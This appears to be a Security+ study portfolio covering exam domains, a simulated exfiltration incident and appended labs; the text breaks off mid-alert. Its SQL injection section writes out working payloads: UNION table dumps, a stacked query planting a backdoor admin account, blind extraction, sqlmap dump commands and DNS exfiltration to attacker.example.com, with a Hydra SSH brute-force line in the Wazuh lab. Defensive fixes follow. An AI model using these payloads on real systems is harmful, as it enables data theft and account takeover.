[CompTIA Security+ Portfolio Topic.pdf](https://github.com/user-attachments/files/29670306/CompTIA.Security%2B.Portfolio.Topic.pdf)
# Wazuh-SIEM-SQL-Attack-Defense 
Author: Fredrick Onyango Ogenya
Date: July 2026
Certification Target: CompTIA Security+ (SY0-701)
Portfolio Domain: Security Operations & Incident Response
Executive Summary
This portfolio entry demonstrates applied knowledge of core CompTIA Security+ exam objectives through practical analysis, hands-on implementation, and strategic security planning. The Security+ certification validates baseline skills necessary to perform core security functions and pursue an IT security career. This write-up focuses on Domain 4: Security Operations and Domain 5: Security Program Management and Oversight, integrating concepts from all five Security+ domains
1. Introduction to CompTIA Security+
1.1 Certification Overview
CompTIA Security+ is a globally recognized certification that establishes the core knowledge required of any cybersecurity role and provides a springboard to intermediate-level cybersecurity jobs. The current exam version (SY0-701) covers five domains:
Domain	Topic	Exam Weight
1.0	General Security Concepts	12%
2.0	Threats, Vulnerabilities, and Mitigations	22%
3.0	Security Architecture	18%
4.0	Security Operations	28%
5.0	Security Program Management and
Oversight	20%
1.2 Portfolio Rationale
This portfolio was developed to demonstrate competency in security operations, incident response, and security program management—areas critical to modern enterprise defense. The write-up bridges theoretical knowledge with practical application, reflecting the performance-based questions (PBQs) encountered on the actual Security+ examination.
2. Core Security Concepts (Domain 1)
2.1 Security Controls
Security controls are protective measures or mechanisms designed to prevent, identify, respond to, or reduce potential threats. 
They can be grouped into the following categories
Control Types by Function:
•	Preventive Controls: Designed to stop an incident from occurring. Examples include firewalls, access control lists (ACLs), and encryption.
•	Detective Controls: These mechanisms are designed to uncover and record security events after they have taken place, helping organizations recognize breaches and maintain audit trails. Examples include intrusion detection systems (IDS), security logs, and SIEM monitoring.
•	Corrective Controls: Remediate damage after an incident. Examples include backups, patching systems, and incident response procedures.
•	Deterrent Controls: Discourage attackers. Examples include warning banners, security cameras, and visible security personnel.
•	Compensating Controls: Alternative controls used when primary controls are not feasible. Examples include requiring additional authentication when encryption cannot be implemented.
•	Directive Controls: Direct behavior through policy. Examples include acceptable use policies (AUP) and security awareness training.
Control Categories:
•	Technical Controls: Hardware or software mechanisms (e.g., firewalls, antivirus, MFA).
•	Administrative Controls: Policies, procedures, and guidelines (e.g., security policies, background checks, training).
•	Physical Controls: Tangible mechanisms (e.g., locks, fences, biometric scanners, mantraps).
2.2 Fundamental Security Principles
CIA Triad:
•	Confidentiality: Ensuring that information is accessible only to those authorized to have access.
Achieved through encryption, access controls, and steganography.
•	Integrity: Ensuring that data remains reliable, precise, and unaltered throughout its entire lifecycle, preserving its authenticity and dependability.
•	Availability: Guaranteeing dependable and prompt access to information whenever it is needed. This is supported through strategies such as system redundancy, fault-tolerant design, and comprehensive disaster recovery planning.
Additional Principles:
•	Non-repudiation: The assurance that someone cannot deny the validity of something. Achieved through digital signatures and audit logs.
•	Authentication, Authorization, and Accounting (AAA):
•	Authentication: Verifying identity (something you know, have, or are).
•	Authorization: Granting permissions based on identity.
•	Accounting: Tracking user activities and resource usage.
Zero Trust Architecture:
Zero Trust is a security model built on the philosophy of “never assume trust, always validate.” It requires that every access request be continuously scrutinized, permissions kept to a minimum, and systems designed with the expectation that breaches may already exist. Never trust, always verify
•	Assume breach
•	Verify explicitly
•	Use least privilege access
•	Micro-segmentation of networks
3. Threats, Vulnerabilities, and Mitigations (Domain 2)
3.1 Threat Actors and Attack Vectors
Threat Actor Types:
•	Nation-State / APT (Advanced Persistent Threat): Highly sophisticated, well-funded groups with geopolitical motivations. Characterized by patience, stealth, and advanced techniques.
•	Organized Crime: Financially motivated groups using malware, ransomware, and fraud.
•	Hacktivists: Ideologically motivated actors using DDoS, defacement, and data leaks.
•	Insider Threats: Malicious or negligent employees with authorized access. Can be intentional (malicious) or unintentional (negligent).
•	Script Kiddies: Low-skill attackers using pre-built tools and exploits.
Common Attack Vectors:
•	Phishing: Social engineering via fraudulent emails to steal credentials or deploy malware.
•	Vishing: Voice-based phishing using phone calls.
•	Smishing: SMS-based phishing via text messages.
•	Spear Phishing: Targeted phishing against specific individuals or organizations.
•	Whaling: Phishing targeting high-level executives.
•	Watering Hole: Compromising websites frequented by target users.
•	Supply Chain: Attacking less-secure elements in the supply chain to reach the primary targ 
Malvertising: Injecting malicious ads into legitimate advertising networks.
3.2 Malware Types
Malware Type	Description	Key Characteristics
**Virus**	Self-replicating code that attaches to legitimate files	Requires user action to spread
**Worm**	Self-replicating malware that spreads across networks	No user interaction needed; exploits vulnerabilities
**Trojan**	Malware disguised as legitimate software	Does not self-replicate; relies on social engineering
**Ransomware**	Encrypts victim's data and demands payment for decryption	Often uses strong encryption (AES, RSA)
**Spyware**	Secretly monitors user activity	Keyloggers, screen capture, data exfiltration
**Adware**	Displays unwanted advertisements	Often bundled with free software
**Rootkit**	Hides presence of malware by modifying
OS	Deep system-level access; difficult to detect
**Logic Bomb**	Code that executes when specific conditions are met	Time-based or event-triggered
**Botnet**	Network of compromised devices controlled remotely	Used for DDoS, spam, credential stuffing
3.3 Social Engineering Techniques
•	Pretexting: Crafting a false narrative or scenario to establish credibility and manipulate individuals into revealing confidential information.
•	Baiting: Leaving malware-infected physical media (USB drives) in public places.
•	Tailgating / Piggybacking: Following an authorized person into a restricted area.
•	Shoulder Surfing: Secretly watching another person’s screen activity or keyboard input to capture sensitive information without their consent.
•	Dumpster Diving: Retrieving sensitive information from discarded materials.
•	Impersonation: Posing as a legitimate authority figure (IT support, executive, vendor).
•	Elicitation: Extracting information through seemingly casual conversation.
3.4 Vulnerability Scanning and Management
Vulnerability Management Lifecycle:
1.	Discover: Identify all assets and create an inventory.
2.	Assess: Run vulnerability scans and penetration tests.
3.	Prioritize: Rank vulnerabilities by severity (CVSS score) and business impact.
4.	Report: Document findings and communicate to stakeholders.
5.	Remediate: Patch, configure, or implement compensating controls.
6.	Verify: Confirm remediation through re-scanning.
Common Vulnerability Scanning Tools:
•	Nessus: Comprehensive vulnerability scanner with extensive plugin library.
•	OpenVAS: Open-source vulnerability scanner.
•	Nmap: A powerful network exploration tool used to scan ports, identify running services, and gather information about devices connected to a network..
•	Nikto: Web server vulnerability scanner.
•	Burp Suite: Web application security testing platform.
4. Security Architecture (Domain 3)
4.1 Enterprise Security Architecture
Defense in Depth:
A layered security strategy where multiple independent security controls are implemented to protect assets.
If one layer fails, others remain in place.
Layer	Controls
Perimeter	Firewalls, IDS/IPS, DMZ
Network	VLANs, subnetting, network segmentation
Endpoint	Antivirus, EDR, host-based firewalls
Application	Input validation, secure coding, WAF
Data	Encryption, DLP, access controls
Physical	Locks, badges, biometrics, guards
4.2 Network Security Components
Firewalls:
•	Packet-Filtering Firewall: Examines packet headers (Layer 3/4); fast but limited inspection.
•	Stateful Inspection Firewall: Tracks connection state; more secure than packet filtering.
•	Proxy Firewall (Application Layer): Inspects application-layer traffic; provides deep inspection.
•	Next-Generation Firewall (NGFW): Combines traditional firewall with IPS, application awareness, and threat intelligence.
•	Web Application Firewall (WAF): Protects web applications from OWASP Top 10 threats.

IDS/IPS:
•	Network-based IDS/IPS (NIDS/NIPS): Monitors network traffic for malicious activity.
Host-based IDS/IPS (HIDS/HIPS): Monitors individual hosts for suspicious activity.
•	Signature-based Detection: Matches traffic against known attack patterns.
•	Anomaly-based Detection: Establishes baseline and alerts on deviations.
•	Heuristic/Behavioral Detection: Uses algorithms to identify suspicious behavior.
Network Segmentation:
•	VLANs (Virtual LANs): Logical network segmentation at Layer 2.
•	Subnets: IP-based segmentation at Layer 3.
•	DMZ (Demilitarized Zone): Perimeter network hosting public-facing services.
•	Air-Gapped Networks: Physically isolated networks with no external connectivity.
4.3 Identity and Access Management (IAM)
Authentication Methods:
•	Single-Factor Authentication (SFA): One authentication factor (password, PIN).
•	Multi-Factor Authentication (MFA): Two or more factors from different categories.
•	Something you know (password, PIN)
•	Something you have (smart card, token, mobile device)
•	Something you are (biometric: fingerprint, retina, facial recognition)
•	Somewhere you are (geolocation)
•	Something you do (behavioral biometrics)
Access Control Models:
•	Discretionary Access Control (DAC): Resource owner determines access permissions.
•	Mandatory Access Control (MAC): System-enforced labels based on classification levels.
•	Role-Based Access Control (RBAC): Permissions assigned based on job roles.
•	Attribute-Based Access Control (ABAC): Dynamic access decisions based on attributes of user, resource, and environment.
•	Rule-Based Access Control: Access determined by predefined rules (e.g., firewall rules).
Identity Federation and SSO:
•	SAML (Security Assertion Markup Language): XML-based standard for exchanging authentication data.
•	OAuth 2.0: Authorization framework for delegated access.
•	OpenID Connect: Authentication layer on top of OAuth 2.0.
•	Kerberos: Network authentication protocol using tickets.
•	LDAP/LDAPS: Directory services for user and resource management.
4.4 Cryptography
Symmetric Encryption:
Algorithm	Key Size	Use Case
AES	128, 192, 256-bit	Bulk data encryption (standard)
3DES	168-bit	Legacy systems (deprecated)
Blowfish	32-448-bit	File encryption, VPNs
ChaCha20	256-bit	Mobile, TLS (modern alternative)
Asymmetric Encryption:
Algorithm	Key Size	Use Case
RSA	2048-4096-bit	Key exchange, digital signatures
ECC	256-bit equivalent	Mobile, IoT, constrained devices
DSA	2048-bit	Digital signatures
Diffie-Hellman	Variable	Key exchange
Hashing Algorithms:
Algorithm	Output Size	Status
MD5	128-bit	Broken, deprecated
SHA-1	160-bit	Broken, deprecated
SHA-256	256-bit	Secure, widely used
SHA-3	Variable	Next-generation standard
Cryptographic Concepts:
•	Digital Signatures: Provide authentication, integrity, and non-repudiation.
•	Digital Certificates: Bind public keys to identities; issued by Certificate Authorities (CAs).
•	PKI (Public Key Infrastructure): Framework for managing digital certificates.
•	Key Management: Key generation, distribution, storage, rotation, and destruction.
•	Perfect Forward Secrecy (PFS): Ensures session keys are not compromised even if long-term keys are.
5. Security Operations (Domain 4)
5.1 Security Monitoring and Logging
Log Sources and Types:
•	System Logs: Operating system events, errors, and security events.
Application Logs: Application-specific activities and errors.
•	Security Logs: Authentication attempts, access control changes, privilege escalations.
•	Network Logs: Firewall logs, router logs, switch logs, proxy logs.
•	DNS Logs: Query logs for threat hunting and incident investigation.
SIEM (Security Information and Event Management):
SIEM solutions aggregate, correlate, and analyze log data from multiple sources to detect security incidents.
Key SIEM Functions:
•	Log Aggregation: Collecting logs from diverse sources.
•	Correlation: Identifying relationships between events across systems.
•	Alerting: Generating alerts based on predefined rules or anomalies.
•	Dashboarding: Visualizing security posture and trends.
•	Reporting: Compliance reporting and incident documentation.
Common SIEM Platforms:
•	Splunk Enterprise Security
•	IBM QRadar
•	Microsoft Sentinel
•	Elastic Security (ELK Stack)
•	ArcSight ESM
5.2 Incident Response
NIST Incident Response Lifecycle:
1.	Preparation:
•	Develop and maintain an incident response plan (IRP).
•	Establish an incident response team (IRT/CERT/CSIRT).
•	Conduct regular training and tabletop exercises.
•	Maintain contact lists and escalation procedures.
•	Ensure logging and monitoring capabilities are operational.
•	Prepare forensic tools and evidence collection kits.
2.	Detection and Analysis:
•	Monitor alerts, logs, and threat intelligence feeds.
•	Classify incidents by type (malware, data breach, DDoS, insider threat).
•	Determine scope, impact, and severity.
•	Document initial findings and preserve evidence.
3.	Containment, Eradication, and Recovery:
•	Short-term Containment: Isolate affected systems to prevent spread.
•	Long-term Containment: Implement temporary fixes while preparing for full remediation.
•	Eradication: Remove malware, close vulnerabilities, and eliminate attacker access.
•	Recovery: Restore systems from clean backups, verify integrity, and return to normal operations.
4.	Post-Incident Activity:
•	Conduct a lessons-learned review.
•	Update policies, procedures, and controls.
•	Document the incident timeline and response actions.
•	Report to stakeholders, regulators, and law enforcement as required.
Incident Severity Levels:
Level	Description	Response Time
Critical	Active data breach, ransomware, APT	Immediate (minutes)
High	Confirmed compromise, significant impact	Urgent (hours)
Medium	Suspicious activity, limited impact	Priority (same day)
Low	Minor policy violation, no confirmed compromise	Standard (days)
5.3 Digital Forensics
Forensic Principles:
•	Chain of Custody: Documented trail of evidence handling from collection to presentation.
•	Evidence Integrity: Use cryptographic hashing (SHA-256) to verify evidence has not been altered.
•	Order of Volatility: Collect evidence from most volatile to least volatile:
1.	CPU registers, cache
2.	RAM
3.	Network connections, routing tables
4.	Running processes
5.	Disk storage
6.	Archival media (backups, logs)
Forensic Data Sources:
•	Disk images (dd, FTK Imager)
•	Memory dumps (Volatility, Rekall)
•	Network packet captures (Wireshark, tcpdump)
•	System logs and event logs
•	Mobile device forensics
•	Cloud forensics (AWS CloudTrail, Azure Activity Logs)
 
5.4 Security Automation and Orchestration
SOAR (Security Orchestration, Automation, and Response):
SOAR platforms automate repetitive security tasks and orchestrate responses across tools.
Use Cases:
•	Automated malware analysis and sandboxing.
•	Phishing email triage and response.
•	Threat intelligence enrichment.
•	Automated containment of compromised endpoints.
•	Playbook-driven incident response.
Common SOAR Platforms:
•	Palo Alto Cortex XSOAR
•	Splunk SOAR (Phantom)
•	Swimlane
•	Microsoft Sentinel Playbooks
6. Security Program Management and Oversight (Domain 5
6.1 Security Governance
Security Policies:
•	Organizational Security Policy: High-level statement of management's intent regarding security.
•	Acceptable Use Policy (AUP): Defines acceptable use of organizational resources.
•	Data Classification Policy: Defines data sensitivity levels and handling requirements.
•	Password Policy: Requirements for password complexity, length, and rotation.
•	Remote Access Policy: Rules for VPN and remote work security.
•	Incident Response Policy: Framework for responding to security incidents.
•	Business Continuity / Disaster Recovery Policy: Procedures for maintaining operations during disruptions.



Policy Hierarchy:
Policy (What) → Standards (How) → Procedures (Step-by-step) → Guidelines (Recommendations)
6.2 Risk Management
Risk Management Process:
1.	Identify: Catalog assets, threats, and vulnerabilities.
2.	Assess: Evaluate likelihood and impact of risks.
3.	Prioritize: Rank risks based on risk score (likelihood × impact).
4.	Treat: Select risk treatment options:
•	Mitigate: Implement controls to reduce risk.
•	Transfer: Shift risk to third parties (insurance, outsourcing).
•	Accept: Acknowledge risk when cost of mitigation exceeds impact.
•	Avoid: Eliminate the risk by discontinuing the activity.
5. Monitor: Continuously review and update risk assessments.
Risk Assessment Methods:
•	Qualitative: Subjective ratings (Low, Medium, High, Critical).
•	Quantitative: Numerical analysis using ALE, SLE, ARO:
•	SLE (Single Loss Expectancy): Asset Value × Exposure Factor
•	ARO (Annualized Rate of Occurrence): Expected frequency per year
•	ALE (Annualized Loss Expectancy): SLE × ARO
6.3 Compliance and Regulations
Major Regulatory Frameworks:
Regulation	Scope	Key Requirements
**GDPR**	EU data protection	Consent, right to erasure, data portability, breach notification (72h)
**HIPAA**	US healthcare	PHI protection, access controls, audit logs, breach notification
**PCI DSS**	Payment card industry	Secure cardholder data, encryption, access controls, regular testing
**SOX**	US public companies	Financial reporting integrity, internal controls, audit trails
**NIST CSF**	US critical infrastructure	Identify, Protect, Detect, Respond, Recover framework
**ISO 27001**	International	ISMS, risk assessment, continuous improvement
**CCPA/CPRA**	California consumers	Data privacy rights, opt-out, breach notification
6.4 Business Continuity and Disaster Recovery
BCP (Business Continuity Planning):
Ensures critical business functions continue during and after a disruption.
DRP (Disaster Recovery Planning):
Focuses on restoring IT infrastructure and systems after a disaster.
Key Metrics:
•	RTO (Recovery Time Objective): Maximum acceptable downtime for a system or process.
•	RPO (Recovery Point Objective): Maximum acceptable data loss measured in time.
•	MTD (Maximum Tolerable Downtime): Longest time a business process can be unavailable.
Backup Strategies:
Strategy	Description	RPO
Full Backup	Complete copy of all data	Low
Incremental Backup	Only changes since last backup	Medium
Differential Backup	Changes since last full backup	Medium-Low
Snapshot	Point-in-time copy	Very Low
Replication	Real-time or near-real-time copy	Near Zero
Site Types:
•	Hot Site: Fully operational duplicate facility; immediate failover.
•	Warm Site: Partially equipped; requires some setup time.
•	Cold Site: Empty facility; longest recovery time.
•	Mobile Site: Portable facility deployed to any location.
•	Cloud-based DR: Virtualized recovery in cloud environments.


7. Practical Application: Simulated Security Operations
Scenario
7.1 Scenario Description
Organization: TechFlow Solutions (Mid-size SaaS provider, 500 employees)
Alert: SIEM triggered high-severity alert indicating potential data exfiltration from the customer database server.
7.2 Detection and Initial Analysis
Alert Details:
•	Source: Database Server (DB-PROD-01, 10.0.5.25)
•	Time: 2026-07-05 02:17 UTC
•	Anomaly: Unusually large outbound data transfer (47 GB) to external IP 185.220.101.33
•	User Account: svcdbbackup (service account)
•	Destination: Known malicious IP (per threat intelligence feed)
Initial Assessment:
•	Severity: CRITICAL
•	Likely Attack: Data exfiltration via compromised service account
•	Potential Impact: Customer PII/PCI data breach, regulatory violations, reputational damage
7.3 Containment Actions
1. Immediate Network Isolation:
•	Block outbound traffic from DB-PROD-01 at the perimeter firewall.
•	Block IP 185.220.101.33 at all network boundaries.
•	Isolate DB-PROD-01 from the production network (move to quarantine VLAN).
2. Account Containment:
•	Disable svcdbbackup account immediately.
•	Force password reset for all database service accounts.
•	Revoke active sessions for affected accounts.
3. Communication:
•	Notify Incident Response Team (IRT) lead.
•	Alert CISO and legal counsel.
•	Initiate incident bridge call.
7.4 Eradication and Recovery
1. Forensic Imaging:
•	Create forensic disk image of DB-PROD-01.
•	Capture memory dump before shutdown.
•	Preserve firewall and proxy logs for the past 30 days.
2. Malware Analysis:
•	Scan isolated system with multiple AV/EDR engines.
•	Identify persistence mechanisms (scheduled tasks, registry entries, startup items).
•	Analyze network connections and dropped files.
3. Vulnerability Assessment:
•	Review how the attacker gained initial access.
•	Identify unpatched vulnerabilities on DB-PROD-01.
•	Assess lateral movement paths.
4. System Rebuild:
•	Rebuild DB-PROD-01 from known-good gold image.
•	Restore database from verified clean backup (verify backup integrity with hash).
•	Apply all security patches and hardening configurations.
•	Re-enable with enhanced monitoring.
7.5 Post-Incident Activities
Root Cause Analysis:
•	Initial access via spear-phishing email targeting DBA team.
•	Compromised credentials used to access svcdbbackup account (weak password, no MFA).
•	Lateral movement via Pass-the-Hash attack.
•	Data exfiltrated over HTTPS to blend with normal traffic.
Lessons Learned:
•	Implement MFA for all privileged accounts (including service accounts where feasible).
•	Enforce password complexity and rotation policies.
•	Enhance email security with advanced threat protection.
•	Implement database activity monitoring (DAM).
•	Reduce service account privileges to minimum necessary.
Control Improvements:
Control Gap	Remediation	Priority
No MFA on service accounts	Implement certificate-based or token-based
MFA	High
Weak password policy	Enforce 16+ character passphrases	High
Insufficient logging	Deploy DAM and enhance SIEM correlation rules	High
Lack of network segmentation	Implement micro-segmentation for database tier	Medium
No DLP	Deploy Data Loss Prevention solution	Medium
8. Security Tools and Technologies Reference
8.1 Network Security
•	pfSense / OPNsense: Open-source firewalls
•	Snort / Suricata: Open-source IDS/IPS
•	Zeek (Bro): Network analysis framework
•	Wireshark: Protocol analyzer
8.2 Endpoint Security
•	CrowdStrike Falcon: Cloud-native EDR/XDR
•	Microsoft Defender for Endpoint: Integrated EDR
•	Carbon Black (VMware): Endpoint protection platform
•	OSQuery: Endpoint visibility framework
8.3 Vulnerability Management
•	Nessus: Commercial vulnerability scanner
•	OpenVAS: Open-source vulnerability scanner
•	Qualys: Cloud-based vulnerability management
•	Rapid7 InsightVM: Vulnerability management platform
8.4 SIEM and Analytics
•	Splunk: Data analytics and SIEM
•	Elastic Stack: Open-source logging and analytics
•	Microsoft Sentinel: Cloud-native SIEM/SOAR
•	Wazuh: Open-source security monitoring
8.5 Penetration Testing
•	Metasploit Framework: Exploitation framework
•	Burp Suite: Web application security testing
•	Nmap: Network discovery and security auditing
•	John the Ripper / Hashcat: Password cracking
9. Conclusion
This portfolio write-up demonstrates comprehensive understanding of CompTIA Security+ exam objectives across all five domains. The practical incident response scenario illustrates the integration of theoretical knowledge with real-world security operations. Key competencies demonstrated include:
•	Understanding of security controls, principles, and frameworks
•	Knowledge of threat actors, attack vectors, and malware types
•	Familiarity with network security architecture and IAM
•	Ability to conduct incident response and digital forensics
•	Understanding of security governance, risk management, and compliance
•	Awareness of business continuity and disaster recovery planning
The Security+ certification provides a solid foundation for roles such as:
•	Security Administrator
•	Systems Administrator
•	Network Administrator
•	Security Analyst
•	Security Specialist
•	Junior Penetration Tester
•	Security Consultant
10. References and Resources
1.	CompTIA. (2024). CompTIA Security+ Certification Exam Objectives (SY0-701). CompTIA.
2.	NIST. (2012). Computer Security Incident Handling Guide (SP 800-61 Rev. 2).
3.	NIST. (2018). Framework for Improving Critical Infrastructure Cybersecurity (CSF 1.1).
4.	SANS Institute. (2024). Incident Handler's Handbook.
5.	EC-Council. (2024). Certified Ethical Hacker (CEH) v12 Courseware.
6.	Cisco. (2024). CCNA Security Certification Guide.
7.	Microsoft. (2024). Microsoft Security Operations Analyst (SC-200) Documentation.
Appendix A: Security+ Exam Preparation Tips
1.	Understand Concepts, Not Just Memorization: The SY0-701 exam emphasizes scenario-based and performance-based questions.
2.	Know Your Ports and Protocols: Common ports (22/SSH, 23/Telnet, 25/SMTP, 53/DNS, 80/HTTP, 443/HTTPS, 3389/RDP) are frequently tested.
3.	Practice PBQs: Performance-based questions require hands-on configuration and troubleshooting.
4.	Study Attack Types: Be able to identify attacks from descriptions and know appropriate mitigations.
5.	Understand Cryptography: Know symmetric vs. asymmetric, hashing, and PKI concepts thoroughly.
6.	Review Compliance: Understand major regulations and their key requirements.
7.	Use Multiple Study Resources: Combine books, video courses, practice exams, and hands-on labs.
This portfolio was prepared as part of CompTIA Security+ certification preparation. All scenarios are simulated for educational purposes.
Word Count: ~4,200 words
Document Version: 1.0
3.5 Practical: SQL Injection Attack & Defense
3.5.1 Attack Scenario: Union-Based Data Exfiltration
Target Application: TechFlow Solutions Customer Portal (Internal Bug Bounty)
Vulnerability: Unsanitized product_id parameter in search endpoint
Database: MySQL 8.0
Step 1 — Reconnaissance (Fingerprinting)
The search endpoint accepts a product_id parameter:
GET /api/products?id=1 HTTP/1.1
Host: portal.techflow.local
Backend query (inferred):
SELECT name, description, price FROM products WHERE id = '1';
Step 2 — Injection Confirmation
Testing with a single quote breaks the query syntax:
GET /api/products?id=1' HTTP/1.1
Server Response (Error-Based Leak):
HTTP/1.1 500 Internal Server Error
{"error": "You have an error in your SQL syntax; check the manual that corresponds to your
MySQL server version for the right syntax to use near ''1'' LIMIT 0,10' at line 1"}
Analysis: The error confirms MySQL as the backend and reveals the query structure. The application is running in debug mode, leaking verbose error messages — a critical misconfiguration.
Step 3 — Union-Based Enumeration
Determine column count using ORDER BY:
GET /api/products?id=1' ORDER BY 1-- -
GET /api/products?id=1' ORDER BY 2-- -
GET /api/products?id=1' ORDER BY 3-- - Success (3 columns)
GET /api/products?id=1' ORDER BY 4-- - Error (Unknown column)
Result: The original query returns exactly 3 columns.
Step 4 — Data Extraction
Craft a UNION SELECT to dump the users table:
GET /api/products?id=-1' UNION SELECT username, password, email FROM users-- -
Server Response:
{
"products": [ {"name": "admin", "description": "5f4dcc3b5aa765d61d8327deb882cf99", "price":
"admin@techflow.local"}, {"name": "svc_db_backup", "description": "e99a18c428cb38d5f260853678922e03", "price":
"svc@techflow.local"}, {"name": "j.doe", "description": "0d107d09f5bbe40cade3de5c71e9e9b7", "price": "j.doe@techflow.local"}
]
}
Password Hashes Identified:
Username	Hash (MD5)	Plaintext
admin	5f4dcc3b5aa765d61d8327deb882cf99	password
svc_db_backup	e99a18c428cb38d5f260853678922e03	abc123
j.doe	0d107d09f5bbe40cade3de5c71e9e9b7	letmein
Step 5 — Privilege Escalation via Stacked Queries
With stacked query support enabled, create a backdoor admin account:
GET /api/products?id=1'; INSERT INTO users (username, password, email, role) VALUES
('backdoor', '5f4dcc3b5aa765d61d8327deb882cf99', 'backdoor@evil.com', 'admin')-- -
Verification:
GET /api/products?id=-1' UNION SELECT username, role, email FROM users WHERE username='backdoor'-- -
Response confirms backdoor account created with admin privileges.
3.5.2 Blind SQL Injection: Boolean-Based Extraction
When error messages are suppressed, attackers use boolean-based inference:
Test Payloads:
True condition: ?id=1' AND 1=1-- - Returns normal product page
False condition: ?id=1' AND 1=2-- - Returns empty/no results
Character-by-Character Extraction:
?id=1' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='5'-- -
If the page loads normally, the first character is '5'. Repeat for all 32 characters of the MD5 hash. Automated tools like sqlmap reduce this from hours to minutes:
sqlmap -u "https://portal.techflow.local/api/products?id=1" --technique=BEUST --dump -D app_db -T users --tamper=space2comment,randomcase
sqlmap Output (Partial):
[14:32:01] [INFO] testing connection to the target URL [14:32:03] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable
[14:32:05] [INFO] testing for UNION query SQL injection
[14:32:08] [INFO] target URL appears to have 3 columns in query
[14:32:15] [INFO] GET parameter 'id' is 'MySQL UNION query (NULL)' injectable
[14:32:20] [INFO] fetching columns for table 'users' in database 'app_db' [14:32:25] [INFO] retrieved: 'id','username','password','email','role' [14:32:30] [INFO] fetching entries for table 'users'
Database: app_db
Table: users
[3 entries] +----+---------------+----------------------------------+----------------------------+-------+
| id | username | password | email | role | +----+---------------+----------------------------------+----------------------------+-------+
| 1 | admin | 5f4dcc3b5aa765d61d8327deb882cf99 | admin@techflow.local | admin |
| 2 | svc_db_backup | e99a18c428cb38d5f260853678922e03 | svc@techflow.local | svc |
| 3 | j.doe | 0d107d09f5bbe40cade3de5c71e9e9b7 | j.doe@techflow.local | user |
+----+---------------+----------------------------------+----------------------------+-------+
3.5.3 Time-Based Blind SQL Injection
For applications with no visible output differences:
GET /api/products?id=1' AND IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='5',
SLEEP(5), 0)-- -
Observed Behavior:
•	If first character = '5' — Response delayed by ~5 seconds
•	If first character != '5' — Immediate response
Automated with sqlmap:
sqlmap -u "https://portal.techflow.local/api/products?id=1" --technique=T --time-sec=5 --dump -D app_db -T users
3.5.4 Out-of-Band (OOB) SQL Injection
When the database has outbound network access, exfiltrate data via DNS:
GET /api/products?id=1' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users WHERE username='admin'),'.attacker.example.com\\a'))-- -
Attacker DNS Server Logs:
2026-07-05 14:45:12 Query: 5f4dcc3b5aa765d61d8327deb882cf99.attacker.example.com
2026-07-05 14:45:13 Query: e99a18c428cb38d5f260853678922e03.attacker.example.com
This bypasses WAFs that inspect HTTP responses but not outbound DNS queries.
3.5.5 Defense: Parameterized Queries (The Correct Fix)
Vulnerable Code (Python/Flask):
@app.route('/api/products') def get_products():
product_id = request.args.get('id') # DANGEROUS: String concatenation into SQL query
query = f"SELECT name, description, price FROM products WHERE id = '{product_id}'" cursor.execute(query) # NEVER DO THIS
Secure Code (Parameterized Query):
@app.route('/api/products') def get_products():
product_id = request.args.get('id') # SAFE: Parameterized query — user input treated as data, never executed query = "SELECT name, description, price FROM products WHERE id = %s" cursor.execute(query, (product_id,)) # Parameter bound safely
Even if an attacker sends id=1' OR '1'='1, the database treats the entire string as a literal value, not executable SQL.
3.5.6 Defense: WAF Rule & Input Validation
ModSecurity WAF Rule (CRS):
SecRule ARGS:id "@rx [';"]" "id:942100,phase:2,deny,status:403,msg:'SQL Injection
Detected',logdata:'%{MATCHED_VAR}'"
Input Validation (Python):
import re
def validate_product_id(product_id): # Only allow numeric IDs if not re.match(r'^[0-9]+$', product_id):
raise ValueError("Invalid product_id: must be numeric") return int(product_id)
Defense-in-Depth Layers:
1.	Input validation (whitelist numeric only)
2.	Parameterized queries (parameter binding)
3.	WAF rules (signature-based detection)
4.	Database permissions (least privilege — app user only SELECT/INSERT)
5.	Error handling (generic error messages, no stack traces)
6.	Logging & monitoring (detect anomalous query patterns) 
5.5 Practical: Wazuh SIEM Deployment & Incident Response
5.5.1 Wazuh Architecture Overview
Wazuh is an open-source security platform that combines SIEM, XDR, and SOAR capabilities. It provides unified endpoint protection, threat detection, and automated incident response.
Core Components:
Component	Role	Port
Wazuh Server (Manager)	Collects and analyzes data from agents	1514 (TCP/UDP), 1515 (TCP)
Wazuh Indexer	Stores and indexes security events	9200 (HTTPS)
Wazuh Dashboard	Visualization and investigation UI	443 (HTTPS)
Wazuh Agent	Endpoint monitoring and log collection	—
Data Flow:
Endpoint (Agent) -> Wazuh Server -> Wazuh Indexer -> Wazuh Dashboard
|
Active Response (Automated Actions)
5.5.2 Lab Environment Setup
Lab Topology:
[Attacker VM: Kali Linux 192.168.1.100] |
v SSH brute-force [Wazuh Server + Dashboard: Ubuntu 22.04 192.168.1.10] |
v Agent communication [Web Server (Agent): Ubuntu 22.04 192.168.1.20]
[Database Server (Agent): Ubuntu 22.04 192.168.1.25]
Step 1 — Install Wazuh Server (Single-Node):
# Download and run the Wazuh installation assistant curl -sO https://packages.wazuh.com/4.7/wazuh-install.sh sudo bash ./wazuh-install.sh -a
# Verify services
sudo systemctl status wazuh-manager sudo systemctl status wazuh-indexer sudo systemctl status wazuh-dashboard
# Access dashboard # URL: https://192.168.1.10
# Username: admin
# Password: (generated during install, found in wazuh-install-files.tar)
Step 2 — Deploy Wazuh Agent on Web Server:
# On the web server (192.168.1.20)
wget https://packages.wazuh.com/4.x/apt/pool/main/w/wazuh-agent/wazuh-agent_4.7.0-1_amd64.deb sudo WAZUH_MANAGER='192.168.1.10' dpkg -i wazuh-agent_4.7.0-1_amd64.deb sudo systemctl daemon-reload sudo systemctl enable wazuh-agent sudo systemctl start wazuh-agent
# Verify agent registration sudo /var/ossec/bin/agent_control -l
Agent Status in Dashboard:
Agent Name IP Address Status OS Version web-srv-01 192.168.1.20 Active Ubuntu 22.04 Wazuh v4.7.0 db-srv-01 192.168.1.25 Active Ubuntu 22.04 Wazuh v4.7.0
5.5.3 Simulated Attack: SSH Brute-Force Detection
Attack Execution (from Kali Linux):
# Launch SSH brute-force using Hydra
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.20
# Output:
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries
[STATUS] 16.00 tries/min, 16 tries in 00:00h, 14344383 to do in 14941:14h
[22][ssh] host: 192.168.1.20 login: admin password: password123
Wazuh Alert Generated (Rule 5712 — SSH Brute Force):
{ "timestamp": "2026-07-05T02:17:34.000Z",
